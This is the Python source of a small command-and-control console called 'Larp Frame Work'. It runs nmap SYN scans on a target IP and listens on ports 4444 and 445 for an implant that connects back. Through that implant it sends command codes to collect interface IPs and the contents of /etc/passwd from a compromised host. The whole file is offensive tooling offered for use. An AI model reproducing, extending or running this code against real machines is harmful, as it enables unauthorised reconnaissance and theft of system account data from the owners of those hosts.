import socket, time, nmap, threading

HOST = "0.0.0.0"
PORT = 4444
otherPort = 445

def recon_HostnameScan():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as ss:
            ss.bind((HOST,otherPort))
            ss.listen()
            conn, addr = ss.accept()
            with conn:
                print(f"\n[+] Connected to {addr}:{PORT}!")
                while True:
                    data = conn.recv(1024)
                    if data:
                        output = data.decode()
                        print(f"\033[32m[!]\033[0m Success! IP's: {output}")
                        break
                    else:
                        time.sleep(1)
                        continue
                ss.close()


def recon_portscan():

    PORTS_SERVICES = {
        20: "FTP",
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        80: "HTTP",
        110: "POP3",
        143: "IMAP",
        443: "HTTPS",
        445: "SMB",
        1716: "KDEConnect",
        3389: "RDP"
    }

    target = input("[+] Enter target IP: ")

    print("[+] Starting Nmap scan...\n")

    scanner = nmap.PortScanner()

    scanner.scan(target, arguments="-sS -p 1-1024")

    for host in scanner.all_hosts():

        print(f"\033[96m[+]\033[0m Host: {host}")
        print(f"\033[96m[+]\033[0m State: {scanner[host].state()}")

        for proto in scanner[host].all_protocols():

            ports = scanner[host][proto].keys()

            for port in sorted(ports):

                state = scanner[host][proto][port]['state']
                

                service = PORTS_SERVICES.get(port, "Unknown")
                if state == "open":
                    print(f"[\033[96m{state.upper()}\033[0m] Port {port} | {service}")
                else:
                    print(f"[\033[91m{state.upper()}\033[0m] Port {port} | {service}")

def passwdRead():
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.bind((HOST,otherPort))
                sock.listen()
                conn, addr = sock.accept()
                with conn:
                    print(f"\n[+] Connected to {addr}:{PORT}!")
                    while True:
                        data = conn.recv(1024)
                        if data:
                            output = data.decode()
                            print(f"\033[32m[+]\033[0m Success! stdout:\n {output}")
                            break
                        else:
                            time.sleep(1)
                            continue
                    sock.close()

def helpmebigyahu():
    print("""--\033[34mLarp Frame Work manual\033[0m--
help - Display's this page.
ScanPort - Scans HOST's ports.
---- \033[34mACCESS NEEDED\033[0m ----
HostnameScan - Scan's HOST's interface IP's.
passwdRead - capture stdout of  /etc/passwd.""")
print("\033[32m[+]\033[0m Enter HELP for MAN page.")

print("Enter 'help' for MAN page.")

while True:
    picker = input("\033[34m(LFW)\033[0m \033[32m$\033[0m ")
    if picker == "ScanPort":
        recon_portscan()
    elif picker == "help":
        helpmebigyahu()
    elif picker == "HostnameScan":
        threading.Thread(target=recon_HostnameScan, daemon=False).start()
        time.sleep(0.1)
        with socket.socket() as s:
            s.bind((HOST,PORT))
            s.listen()
            conn, addr = s.accept()
            with conn:
                hs = "hS"
                conn.sendall(hs.encode())
                s.close()
    elif picker == "passwdRead":
        threading.Thread(target=passwdRead, daemon=False).start()
        time.sleep(0.1)
        with socket.socket() as s:
            s.bind((HOST,PORT))
            s.listen()
            conn, addr = s.accept()
            with conn:
                hs = "pR"
                conn.sendall(hs.encode())
                s.close()
        
